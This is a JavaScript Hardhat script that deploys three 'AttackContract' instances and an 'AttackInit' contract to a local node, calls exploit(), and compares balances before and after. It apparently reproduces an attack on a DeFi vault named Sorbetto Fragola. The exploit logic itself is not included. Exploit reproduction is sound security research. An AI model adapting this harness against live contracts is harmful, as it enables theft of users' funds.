
const hre = require("hardhat");
const Web3 = require('web3');
const ethers = require('ethers');

async function main() {

  await hre.run('compile');

  const myDummyAccount = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";
  const _gas = 29000000;
  const _gasPrice = '30000000000000';
  const web3 = new Web3("http://127.0.0.1:8545/");


  const jsonAttackFile = require('../artifacts/contracts/SorbettoFragola.sol/AttackContract.json');
  const jsonAttackABI = jsonAttackFile.abi;

  var atkContractA = new web3.eth.Contract(jsonAttackABI);
  atkContractA.options.data = jsonAttackFile.bytecode;

  var atkContractB = new web3.eth.Contract(jsonAttackABI);
  atkContractB.options.data = jsonAttackFile.bytecode;

  var atkContractC = new web3.eth.Contract(jsonAttackABI);
  atkContractC.options.data = jsonAttackFile.bytecode;

  console.log("Starting...");

  await atkContractA.deploy({ })
  .send({
      from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("Atk Contract A address: ", newContractInstance.options.address)
      atkContractA.options.address = newContractInstance.options.address;
  });

  await atkContractB.deploy({ })
  .send({
      from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("Atk Contract B address: ", newContractInstance.options.address)
      atkContractB.options.address = newContractInstance.options.address;
  });

  await atkContractC.deploy({ })
  .send({
      from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("Atk Contract C address: ", newContractInstance.options.address)
      atkContractC.options.address = newContractInstance.options.address;
  });


  /////////////////////////

  const jsonAttackInitFile = require('../artifacts/contracts/AttackInit.sol/AttackInit.json');
  const jsonAttackInitABI = jsonAttackInitFile.abi;

  var atkInit = new web3.eth.Contract(jsonAttackInitABI);
  atkInit.options.data = jsonAttackInitFile.bytecode;

  await atkInit.deploy({ arguments : [atkContractA.options.address, atkContractB.options.address, atkContractC.options.address] })
  .send({
      from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("Atk Init Contract address: ", newContractInstance.options.address)
      atkInit.options.address = newContractInstance.options.address;
  });


  await atkInit.methods.checkBalance(myDummyAccount).send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkInit.methods.checkBalance(atkInit.options.address).send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkInit.methods.exploit().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkInit.methods.checkBalance(myDummyAccount).send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  console.log("Exitting...");
}


// main();

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
